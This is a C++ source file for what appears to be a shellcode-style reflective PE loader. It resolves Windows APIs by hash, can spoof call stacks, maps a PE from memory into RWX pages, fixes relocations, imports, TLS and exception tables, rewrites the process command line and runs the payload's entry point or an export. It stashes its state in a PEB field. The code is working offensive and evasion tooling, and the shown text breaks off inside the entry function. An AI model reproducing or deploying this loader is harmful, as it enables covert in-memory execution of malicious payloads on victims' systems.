#include <General.hpp>

using namespace mscorlib;

auto DECLFN LibLoad(CHAR* LibName) -> UPTR {
	G_INSTANCE

		if (!Instance->Ctx.IsSpoof) {
			return (UPTR)Instance->Win32.LoadLibraryA(LibName);
		}

	Instance->Win32.DbgPrint("load %p\n", Instance->Win32.LoadLibraryA);

	return (UPTR)Spoof::Call((UPTR)(Instance->Win32.LoadLibraryA), 0, (UPTR)LibName);
}

auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
	UPTR Ntdll = LoadModule(HashStr("ntdll.dll"));
	UPTR Kernel32 = LoadModule(HashStr("kernel32.dll"));
	UPTR Msvcrt = LoadModule(HashStr("msvcrt.dll"));
	UPTR Shell32 = LoadModule(HashStr("shell32.dll"));

	Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

	if (!Shell32) LibLoad("shell32.dll");

	Instance->Win32.lstrcpyW = (decltype(Instance->Win32.lstrcpyW))LoadApi(Kernel32, HashStr("lstrcpyW"));
	Instance->Win32.swprintf = (decltype(Instance->Win32.swprintf))LoadApi(Msvcrt, HashStr("swprintf"));
	Instance->Win32.strcmp = (decltype(Instance->Win32.strcmp))LoadApi(Msvcrt, HashStr("strcmp"));
	Instance->Win32.wcslen = (decltype(Instance->Win32.wcslen))LoadApi(Msvcrt, HashStr("wcslen"));
	Instance->Win32.HeapAlloc = (decltype(Instance->Win32.HeapAlloc))LoadApi(Kernel32, HashStr("HeapAlloc"));
	Instance->Win32.HeapFree = (decltype(Instance->Win32.HeapFree))LoadApi(Kernel32, HashStr("HeapFree"));
	Instance->Win32.swprintfw = (decltype(Instance->Win32.swprintfw))LoadApi(Msvcrt, HashStr("swprintfW"));
	Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));

	Instance->Win32.RtlAllocateHeap = (decltype(Instance->Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
	Instance->Win32.RtlReAllocateHeap = (decltype(Instance->Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
	Instance->Win32.RtlFreeHeap = (decltype(Instance->Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));
	Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Ntdll, HashStr("RtlSecureZeroMemory"));
	Instance->Win32.RtlAddFunctionTable = (decltype(Instance->Win32.RtlAddFunctionTable))LoadApi(Ntdll, HashStr("RtlAddFunctionTable"));

	Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
	Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

	Instance->Win32.GetProcAddress = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
	Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));
	Instance->Win32.CreateThread = (decltype(Instance->Win32.CreateThread))LoadApi(Kernel32, HashStr("CreateThread"));
	Instance->Win32.CloseHandle = (decltype(Instance->Win32.CloseHandle))LoadApi(Kernel32, HashStr("CloseHandle"));

	Instance->Win32.NtAllocateVirtualMemory = (decltype(Instance->Win32.NtAllocateVirtualMemory))LoadApi(Ntdll, HashStr("NtAllocateVirtualMemory"));
	Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));
	Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

	Instance->Win32.LdrGetProcedureAddress = (decltype(Instance->Win32.LdrGetProcedureAddress))LoadApi(Ntdll, HashStr("LdrGetProcedureAddress"));
	Instance->Win32.GetConsoleWindow = (decltype(Instance->Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
	Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
	Instance->Win32.FreeConsole = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

	Instance->Win32.ReadFile = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
	Instance->Win32.WriteFile = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
	Instance->Win32.SetStdHandle = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
	Instance->Win32.GetStdHandle = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

	Instance->Win32.NtGetContextThread = (decltype(Instance->Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
	Instance->Win32.NtContinue = (decltype(Instance->Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
	Instance->Win32.RtlCaptureContext = (decltype(Instance->Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

	Instance->Win32.RtlAddVectoredExceptionHandler = (decltype(Instance->Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
	Instance->Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance->Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

	Instance->Win32.RtlInitializeCriticalSection = (decltype(Instance->Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
	Instance->Win32.RtlEnterCriticalSection = (decltype(Instance->Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
	Instance->Win32.RtlLeaveCriticalSection = (decltype(Instance->Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

	Instance->Win32.RtlLookupFunctionEntry = (decltype(Instance->Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
	Instance->Win32.RtlUserThreadStart = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
	Instance->Win32.BaseThreadInitThunk = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));
	Instance->Win32.RtlExitUserThread = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
	Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
}

// Alloc virtual memory for PE
auto DECLFN AllocVm(PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection) -> NTSTATUS {
	G_INSTANCE

		Instance->Win32.DbgPrint("[+] Allocating virtual memory: Size=%llu, AllocType=%lu, Protection=%lu\n", *Size, AllocType, Protection);
	if (!Instance->Ctx.IsSpoof) {
		return Instance->Win32.NtAllocateVirtualMemory(
			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection
		);
	}
	else {
		return Instance->Win32.NtAllocateVirtualMemory(
			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection
		);
	}
}

// define memory protections
auto DECLFN ProtVm(PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt) -> NTSTATUS {
	G_INSTANCE

		if (!Instance->Ctx.IsSpoof) {
			return Instance->Win32.NtProtectVirtualMemory(NtCurrentProcess(), Address, Size, NewProt, OldProt);
		}

	return (Instance->Win32.NtProtectVirtualMemory(NtCurrentProcess(), Address, Size, NewProt, OldProt));
}

auto DECLFN FixTls(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID
{
	if (!DataDir || !DataDir->VirtualAddress || !DataDir->Size)
		return;

	auto TlsDir =
		(PIMAGE_TLS_DIRECTORY)((UPTR)Base + DataDir->VirtualAddress);

	// AddressOfCallBacks is a VA, NOT an RVA
	auto Callbacks =
		(PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

	if (!Callbacks)
		return;

	for (; *Callbacks; ++Callbacks)
	{
		(*Callbacks)(
			(PVOID)Base,
			DLL_PROCESS_ATTACH,
			nullptr
			);
	}
}

auto DECLFN ValidateExceptionDirectory(
	_In_ PVOID Base,
	_In_ IMAGE_NT_HEADERS* Header
) -> BOOL {
	G_INSTANCE

		IMAGE_DATA_DIRECTORY* ExceptDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (!ExceptDir->Size || !ExceptDir->VirtualAddress) {
		Instance->Win32.DbgPrint("[*] No exception directory.\n");
		return TRUE;  // Not having exceptions is okay
	}

	PIMAGE_RUNTIME_FUNCTION_ENTRY Entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UPTR)Base + ExceptDir->VirtualAddress);
	DWORD EntryCount = ExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

	Instance->Win32.DbgPrint("[+] Validating %lu exception entries...\n", EntryCount);

	for (DWORD i = 0; i < EntryCount; i++) {
		// BeginAddress and EndAddress should be valid RVAs
		if (Entry[i].BeginAddress >= Header->OptionalHeader.SizeOfImage) {
			Instance->Win32.DbgPrint("[-] Exception entry %lu has invalid BeginAddress: 0x%X\n", i, Entry[i].BeginAddress);
			return FALSE;
		}
		if (Entry[i].EndAddress > Header->OptionalHeader.SizeOfImage) {
			Instance->Win32.DbgPrint("[-] Exception entry %lu has invalid EndAddress: 0x%X\n", i, Entry[i].EndAddress);
			return FALSE;
		}
		if (Entry[i].EndAddress <= Entry[i].BeginAddress) {
			Instance->Win32.DbgPrint("[-] Exception entry %lu has EndAddress <= BeginAddress\n", i);
			return FALSE;
		}
	}

	Instance->Win32.DbgPrint("[+] Exception directory validation passed.\n");
	return TRUE;
}

auto DECLFN FixExp(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
	G_INSTANCE

		if (!DataDir || !DataDir->Size || !DataDir->VirtualAddress) {
			Instance->Win32.DbgPrint("[*] No exception directory present.\n");
			return;
		}

	PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((UPTR)Base + DataDir->VirtualAddress);
	DWORD EntryCount = DataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);

	if (EntryCount == 0) {
		Instance->Win32.DbgPrint("[*] Exception directory is empty.\n");
		return;
	}

	Instance->Win32.DbgPrint("[+] Found %lu exception entries at %p\n", EntryCount, FncEntry);

	BOOL Success = Instance->Win32.RtlAddFunctionTable(
		(PRUNTIME_FUNCTION)FncEntry,
		EntryCount,
		(ULONG64)Base
	);

	if (!Success)
		Instance->Win32.DbgPrint("[-] RtlAddFunctionTable failed!\n");
	else
		Instance->Win32.DbgPrint("[+] Successfully registered %lu function table entries.\n", EntryCount);
}

auto DECLFN FixImp(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> BOOL
{
	G_INSTANCE

		if (!DataDir || !DataDir->VirtualAddress || !DataDir->Size)
			return TRUE;

	auto ImpDesc =
		(PIMAGE_IMPORT_DESCRIPTOR)((UPTR)Base + DataDir->VirtualAddress);

	for (; ImpDesc->Name; ++ImpDesc)
	{
		auto DllName =
			(CHAR*)((UPTR)Base + ImpDesc->Name);

		PVOID DllBase =
			Instance->Win32.GetModuleHandleA(DllName);

		if (!DllBase)
			DllBase = (PVOID)LibLoad(DllName);

		if (!DllBase) {
			Instance->Win32.DbgPrint("[-] Failed to load DLL: %s\n", DllName);
			return FALSE;
		}

		Instance->Win32.DbgPrint("[+] Loaded DLL: %s at %p\n", DllName, DllBase);

		PIMAGE_THUNK_DATA64 FirstThunk =
			(PIMAGE_THUNK_DATA64)((UPTR)Base + ImpDesc->FirstThunk);

		PIMAGE_THUNK_DATA64 OrigThunk =
			ImpDesc->OriginalFirstThunk
			? (PIMAGE_THUNK_DATA64)((UPTR)Base + ImpDesc->OriginalFirstThunk)
			: FirstThunk;

		for (; OrigThunk->u1.AddressOfData; ++OrigThunk, ++FirstThunk)
		{
			PVOID Function = nullptr;

			if (IMAGE_SNAP_BY_ORDINAL64(OrigThunk->u1.Ordinal))
			{
				NTSTATUS st =
					Instance->Win32.LdrGetProcedureAddress(
						(HMODULE)DllBase,
						nullptr,
						(ULONG)IMAGE_ORDINAL64(OrigThunk->u1.Ordinal),
						&Function
					);

				if (!NT_SUCCESS(st) || !Function) {
					Instance->Win32.DbgPrint("[-] Failed to get ordinal function\n");
					return FALSE;
				}
			}
			else
			{
				auto ImportByName =
					(PIMAGE_IMPORT_BY_NAME)(
						(UPTR)Base + OrigThunk->u1.AddressOfData
						);

				ANSI_STRING Name;
				Name.Buffer = (PCHAR)ImportByName->Name;
				Name.Length = (USHORT)Str::LengthA(Name.Buffer);
				Name.MaximumLength = Name.Length + 1;

				NTSTATUS st =
					Instance->Win32.LdrGetProcedureAddress(
						(HMODULE)DllBase,
						&Name,
						0,
						&Function
					);

				if (!NT_SUCCESS(st) || !Function) {
					Instance->Win32.DbgPrint("[-] Failed to get function: %s\n", Name.Buffer);
					return FALSE;
				}
			}

			FirstThunk->u1.Function = (ULONGLONG)Function;
		}
	}

	return TRUE;
}

// Fix relocations
void FixRel(PVOID Base, UPTR Delta, IMAGE_DATA_DIRECTORY* Dir, SIZE_T SizeOfImage)
{
	G_INSTANCE

		if (!Dir->VirtualAddress || !Dir->Size) {
			Instance->Win32.DbgPrint("[*] No relocations present.\n");
			return;
		}

	if (!Delta) {
		Instance->Win32.DbgPrint("[*] Delta is zero, skipping relocations.\n");
		return;
	}

	Instance->Win32.DbgPrint("[+] Applying relocations. Delta: 0x%llX, Dir Size: 0x%lX, Image Size: 0x%llX\n", Delta, Dir->Size, SizeOfImage);

	auto Reloc = (PIMAGE_BASE_RELOCATION)((UPTR)Base + Dir->VirtualAddress);
	auto End   = (UPTR)Reloc + Dir->Size;
	ULONG RelocationCount = 0;
	ULONG SkippedCount = 0;

	while ((UPTR)Reloc < End && Reloc->SizeOfBlock)
	{
		auto Count = (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		auto Entry = (PWORD)(Reloc + 1);
		auto Page = (UPTR)Base + Reloc->VirtualAddress;

		for (UINT i = 0; i < Count; i++, Entry++)
		{
			WORD Type = *Entry >> 12;
			WORD Offset = *Entry & 0xFFF;

			if (Type == IMAGE_REL_BASED_DIR64)  // Type 10 - PE32+ standard
			{
				ULONGLONG* AddressPtr = (ULONGLONG*)(Page + Offset);

				// Bounds check
				if ((UPTR)AddressPtr < (UPTR)Base || (UPTR)AddressPtr >= ((UPTR)Base + SizeOfImage)) {
					Instance->Win32.DbgPrint("[-] WARNING: Relocation address out of bounds: %p\n", AddressPtr);
					SkippedCount++;
					continue;
				}

				*AddressPtr += Delta;
				RelocationCount++;
			}
			else if (Type == IMAGE_REL_BASED_ABSOLUTE)
			{
				continue;
			}
			else if (Type != 0)
			{
				Instance->Win32.DbgPrint("[*] Unsupported relocation type: %d at %p\n", Type, Page + Offset);
			}
		}
		Reloc = (PIMAGE_BASE_RELOCATION)((UPTR)Reloc + Reloc->SizeOfBlock);
	}

	Instance->Win32.DbgPrint("[+] Applied %lu relocations. Skipped %lu.\n", RelocationCount, SkippedCount);

	if (RelocationCount == 0 && SkippedCount > 0) {
		Instance->Win32.DbgPrint("[-] ERROR: All relocations were skipped! PE will likely crash.\n");
	}
}

// Fix command line arguments
auto DECLFN FixArguments(WCHAR* wArguments) -> VOID {
	G_INSTANCE

		PPEB Peb = NtCurrentPeb();
	PRTL_USER_PROCESS_PARAMETERS pParam = Peb->ProcessParameters;

	Instance->Win32.DbgPrint("[+] Original CommandLine: %.*S\n",
		pParam->CommandLine.Length / sizeof(WCHAR),
		pParam->CommandLine.Buffer
	);

	if (!wArguments || !*wArguments)
		return;

	SIZE_T len = (Instance->Win32.wcslen(wArguments) + 1) * sizeof(WCHAR);

	PWSTR NewBuf = (PWSTR)Instance->Win32.RtlAllocateHeap(
		Peb->ProcessHeap,
		HEAP_ZERO_MEMORY,
		len
	);

	if (!NewBuf)
		return;

	Mem::Copy(NewBuf, wArguments, len);

	pParam->CommandLine.Buffer = NewBuf;
	pParam->CommandLine.Length = (USHORT)(len - sizeof(WCHAR));
	pParam->CommandLine.MaximumLength = (USHORT)len;

	Instance->Win32.DbgPrint("[+] New CommandLine: %.*S\n",
		pParam->CommandLine.Length / sizeof(WCHAR),
		pParam->CommandLine.Buffer
	);
}

auto DECLFN FixMemPermissions(
	BYTE* PeBaseAddr,
	IMAGE_NT_HEADERS* Header,
	IMAGE_SECTION_HEADER* SecHeader
) -> VOID
{
	G_INSTANCE

		for (INT i = 0; i < Header->FileHeader.NumberOfSections; i++) {

			if (!SecHeader[i].Misc.VirtualSize)
				continue;

			ULONG SecChar = SecHeader[i].Characteristics;
			ULONG NewProt = PAGE_READONLY;

			if (SecChar & IMAGE_SCN_MEM_EXECUTE) {
				NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
			}
			else {
				NewProt = (SecChar & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
			}

			BYTE* SectionBase = PeBaseAddr + SecHeader[i].VirtualAddress;

			UPTR ProtectBase = ALIGN_DOWN((UPTR)SectionBase, 0x1000);

			SIZE_T ProtectSize = ALIGN_UP((max(SecHeader[i].Misc.VirtualSize, SecHeader[i].SizeOfRawData)) + ((UPTR)SectionBase - ProtectBase), 0x1000);

			PVOID ProtectBasePtr = (PVOID)ProtectBase;
			ULONG OldProt = 0;

			ProtVm(&ProtectBasePtr, &ProtectSize, NewProt, &OldProt);
		}
}

auto DECLFN FetchExportedFnAddr(PIMAGE_DATA_DIRECTORY pEntryExportDataDir, ULONG_PTR PeBaseAddr, LPCSTR FnName) -> PVOID 
{
	G_INSTANCE

	PIMAGE_EXPORT_DIRECTORY         pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(PeBaseAddr + pEntryExportDataDir->VirtualAddress);
	PDWORD                          FunctionNameArray = (PDWORD)(PeBaseAddr + pImgExportDir->AddressOfNames);
	PDWORD                          FunctionAddressArray = (PDWORD)(PeBaseAddr + pImgExportDir->AddressOfFunctions);
	PWORD                           FunctionOrdinalArray = (PWORD)(PeBaseAddr + pImgExportDir->AddressOfNameOrdinals);

	Instance->Win32.DbgPrint("[+] Function to search: %s\n", FnName);
	Instance->Win32.DbgPrint("[+] Number of Exported Functions: %d\n", pImgExportDir->NumberOfFunctions);
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) 
	{
		CHAR* FnNameParsed = (CHAR*)(PeBaseAddr + FunctionNameArray[i]);
		PVOID	FnAddr = (PVOID)(PeBaseAddr + FunctionAddressArray[FunctionOrdinalArray[i]]);
		Instance->Win32.DbgPrint("[+] Exported Function: %s at %p\n", FnNameParsed, FnAddr);

		Instance->Win32.DbgPrint("[*] Comparing %s with %s\n", FnName, FnNameParsed);
		if (Instance->Win32.strcmp(FnName, FnNameParsed) == 0) {
			return FnAddr;
		}
	}

	return NULL;
}


auto DECLFN Reflect(BYTE* Buffer, ULONG Size, WCHAR* Arguments, WCHAR* ExportedFnName) -> BOOL {

	G_INSTANCE

		Instance->Win32.DbgPrint("[+] === PE LOADER START ===\n");
	Instance->Win32.DbgPrint("[+] Buffer: %p, Size: 0x%X\n", Buffer, Size);

	// Validate MZ signature
	if (*(USHORT*)Buffer != 0x5A4D) {
		Instance->Win32.DbgPrint("[-] No MZ signature\n");
		return FALSE;
	}

	IMAGE_DOS_HEADER* DosHdr = (IMAGE_DOS_HEADER*)Buffer;

	// Validate e_lfanew
	if (DosHdr->e_lfanew < 64 || DosHdr->e_lfanew > 512) {
		Instance->Win32.DbgPrint("[-] Invalid e_lfanew: 0x%X\n", DosHdr->e_lfanew);
		return FALSE;
	}

	Instance->Win32.DbgPrint("[+] e_lfanew: 0x%X\n", DosHdr->e_lfanew);

	// Get PE header
	IMAGE_NT_HEADERS* Header = (IMAGE_NT_HEADERS*)(Buffer + DosHdr->e_lfanew);

	// Validate PE signature
	if (Header->Signature != 0x4550) {
		Instance->Win32.DbgPrint("[-] Invalid PE signature: 0x%X\n", Header->Signature);
		return FALSE;
	}

	Instance->Win32.DbgPrint("[+] PE signature valid: 0x%X\n", Header->Signature);
	Instance->Win32.DbgPrint("[+] Machine: 0x%X (x64)\n", Header->FileHeader.Machine);
	Instance->Win32.DbgPrint("[+] NumberOfSections: %u\n", Header->FileHeader.NumberOfSections);

	USHORT Magic = Header->OptionalHeader.Magic;
	Instance->Win32.DbgPrint("[+] Magic: 0x%04X (PE32+ (64-bit))\n", Magic);

	ULONGLONG ImageBase = 0;
	SIZE_T SizeOfImage = 0;
	SIZE_T SizeOfHeaders = 0;
	ULONG AddressOfEntryPoint = 0;
	PIMAGE_DATA_DIRECTORY DataDirs = NULL;
	DWORD NumberOfRvaAndSizes = 0;

	PIMAGE_OPTIONAL_HEADER64 OptHdr64 = (PIMAGE_OPTIONAL_HEADER64)&Header->OptionalHeader;
	ImageBase = OptHdr64->ImageBase;
	SizeOfImage = OptHdr64->SizeOfImage;
	SizeOfHeaders = OptHdr64->SizeOfHeaders;
	AddressOfEntryPoint = OptHdr64->AddressOfEntryPoint;
	DataDirs = OptHdr64->DataDirectory;
	NumberOfRvaAndSizes = OptHdr64->NumberOfRvaAndSizes;

	Instance->Win32.DbgPrint("[+] ImageBase: 0x%llX (64-bit)\n", ImageBase);
	Instance->Win32.DbgPrint("[+] SizeOfImage: 0x%X\n", SizeOfImage);
	Instance->Win32.DbgPrint("[+] SizeOfHeaders: 0x%X\n", SizeOfHeaders);
	Instance->Win32.DbgPrint("[+] AddressOfEntryPoint: 0x%X\n", AddressOfEntryPoint);
	Instance->Win32.DbgPrint("[+] NumberOfRvaAndSizes: %u\n", NumberOfRvaAndSizes);

	// Validate ImageBase
	if (ImageBase == 0) {
		Instance->Win32.DbgPrint("[-] ImageBase is ZERO - PE is corrupted!\n");
		return FALSE;
	}

	// Validate SizeOfImage
	if (SizeOfImage == 0 || SizeOfImage > 0x10000000) {
		Instance->Win32.DbgPrint("[-] Invalid SizeOfImage: 0x%X\n", SizeOfImage);
		return FALSE;
	}

	// Allocate memory
	SIZE_T RegionSize = SizeOfImage;
	BYTE* PeBaseAddr = nullptr;
	NTSTATUS AllocStatus;

	Instance->Win32.DbgPrint("[+] Allocating 64-bit PE in full 64-bit address space\n");
	AllocStatus = Instance->Win32.NtAllocateVirtualMemory(
		NtCurrentProcess(),
		(PVOID*)&PeBaseAddr,
		0,
		&RegionSize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);

	if (!NT_SUCCESS(AllocStatus) || !PeBaseAddr) {
		Instance->Win32.DbgPrint("[-] Allocation failed: 0x%X\n", AllocStatus);
		return FALSE;
	}

	Instance->Win32.DbgPrint("[+] Allocated at: %p (0x%X bytes)\n", PeBaseAddr, SizeOfImage);

	__asm("int3");

	// Copy PE headers
	Mem::Copy(PeBaseAddr, Buffer, SizeOfHeaders);
	Instance->Win32.DbgPrint("[+] Copied headers\n");

	// Copy PE sections
	IMAGE_SECTION_HEADER* SecHeader = IMAGE_FIRST_SECTION(Header);
	for (int i = 0; i < Header->FileHeader.NumberOfSections; i++) {
		BYTE* dst = PeBaseAddr + SecHeader[i].VirtualAddress;
		BYTE* src = Buffer + SecHeader[i].PointerToRawData;
		SIZE_T rawSize = SecHeader[i].SizeOfRawData;
		SIZE_T virtSize = SecHeader[i].Misc.VirtualSize;

		if (rawSize)
			Mem::Copy(dst, src, rawSize);
		if (virtSize > rawSize)
			Mem::Set(dst + rawSize, 0, virtSize - rawSize);
	}
	Instance->Win32.DbgPrint("[+] Copied sections\n");


	ULONG_PTR Delta = (ULONG_PTR)PeBaseAddr - ImageBase;
	Instance->Win32.DbgPrint("[+] Relocation Delta: 0x%llX\n", Delta);
	Instance->Win32.DbgPrint("[+]   Loaded at: %p\n", PeBaseAddr);
	Instance->Win32.DbgPrint("[+]   ImageBase: 0x%llX\n", ImageBase);

	if (NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
		IMAGE_DATA_DIRECTORY* RelocDir = &DataDirs[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		Instance->Win32.DbgPrint("[+] Reloc Directory: RVA=0x%X, Size=0x%X\n",
			RelocDir->VirtualAddress, RelocDir->Size);

		FixRel(PeBaseAddr, Delta, RelocDir, SizeOfImage);
	}
	else {
		Instance->Win32.DbgPrint("[-] DataDirectory array too small\n");
		return FALSE;
	}

	// Fix imports
	if (NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IMPORT)
	{
		IMAGE_DATA_DIRECTORY* ImportDir = &DataDirs[IMAGE_DIRECTORY_ENTRY_IMPORT];
		Instance->Win32.DbgPrint("[+] Import Directory: RVA=0x%X, Size=0x%X\n", ImportDir->VirtualAddress, ImportDir->Size);

		if (!FixImp(PeBaseAddr, ImportDir)) {
			Instance->Win32.DbgPrint("[-] Import fixup failed\n");
			return FALSE;
		}
		Instance->Win32.DbgPrint("[+] Fixed imports\n");
	}

	// Fix command line arguments
	FixArguments(Arguments);
	Instance->Win32.DbgPrint("[+] Fixed arguments\n");

	Instance->Win32.DbgPrint("[+] Arguments set to: %ws\n", Arguments);

	// Fix memory permissions
	FixMemPermissions(PeBaseAddr, Header, SecHeader);
	Instance->Win32.DbgPrint("[+] Fixed memory permissions\n");

	// Get Exported address of function
	Instance->Win32.DbgPrint("[+] Exported Function Name send to search: %s\n", ExportedFnName);
	IMAGE_DATA_DIRECTORY* EntryExportDir = &DataDirs[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PVOID ExportedFnAddr = NULL;

	if (EntryExportDir->Size && EntryExportDir->VirtualAddress && ExportedFnName)
	{
		ExportedFnAddr = FetchExportedFnAddr(EntryExportDir, (ULONG_PTR)PeBaseAddr, (LPCSTR)ExportedFnName);
		Instance->Win32.DbgPrint("[+] Exported Function Address: %p\n", ExportedFnAddr);
	}

	// Register exception handlers
	if (NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_EXCEPTION) {
		IMAGE_DATA_DIRECTORY* ExceptDir = &DataDirs[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
		Instance->Win32.DbgPrint("[+] Exception Directory: RVA=0x%X, Size=0x%X\n",
			ExceptDir->VirtualAddress, ExceptDir->Size);
		FixExp(PeBaseAddr, ExceptDir);
		Instance->Win32.DbgPrint("[+] Registered exception handlers\n");
	}

	// Call TLS callbacks
	if (NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_TLS) {
		IMAGE_DATA_DIRECTORY* TlsDir = &DataDirs[IMAGE_DIRECTORY_ENTRY_TLS];
		Instance->Win32.DbgPrint("[+] TLS Directory: RVA=0x%X, Size=0x%X\n",
			TlsDir->VirtualAddress, TlsDir->Size);
		FixTls(PeBaseAddr, TlsDir);
		Instance->Win32.DbgPrint("[+] Called TLS callbacks\n");
	}

	// Get entry point
	PVOID pEntryPoint = (PVOID)((UPTR)PeBaseAddr + AddressOfEntryPoint);
	BOOL isDllFile = (Header->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;

	Instance->Win32.DbgPrint("[+] Entry point: %p (RVA: 0x%X)\n", pEntryPoint, AddressOfEntryPoint);
	Instance->Win32.DbgPrint("[+] Type: %s\n", isDllFile ? "DLL" : "EXE");

	__asm("int3");
	// Execute the loaded PE
	BOOL Result = FALSE;
	HANDLE hThread = NULL;

	if (isDllFile) {
		typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
		Instance->Win32.DbgPrint("[+] Calling DllMain...\n");
		Result = ((DLLMAIN)pEntryPoint)((HINSTANCE)PeBaseAddr, DLL_PROCESS_ATTACH, NULL);
		if (ExportedFnAddr) {
			Instance->Win32.DbgPrint("[+] Calling exported function: %ws\n", ExportedFnName);
			hThread = Instance->Win32.CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)ExportedFnAddr, NULL, 0, NULL );
		}
		if(hThread) {
			Instance->Win32.DbgPrint("[+] Waiting for exported function thread to complete...\n");
			Instance->Win32.WaitForSingleObject(hThread, INFINITE);
			Instance->Win32.CloseHandle(hThread);
		}
	}
	else {
		typedef int(WINAPI* MAIN)();
		Instance->Win32.DbgPrint("[+] Calling main...\n");
		int ExitCode = ((MAIN)pEntryPoint)();
		Instance->Win32.DbgPrint("[+] main returned: %d\n", ExitCode);
		Result = (ExitCode == 0) ? TRUE : FALSE;
	}

	return Result;
}

EXTERN_C
auto DECLFN Entry(PVOID Parameter) -> VOID {
	PARSER   Psr = { 0 };
	INSTANCE Instance = { 0 };

	PVOID ArgBuffer = nullptr;

	NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

	Instance.Start = StartPtr();
	Instance.Size = (UPTR)EndPtr() - (UPTR)Instance.Start;
	Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

	Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)((UPTR)Instance.Start + Instance.Size);

	LoadEssentials(&Instance);

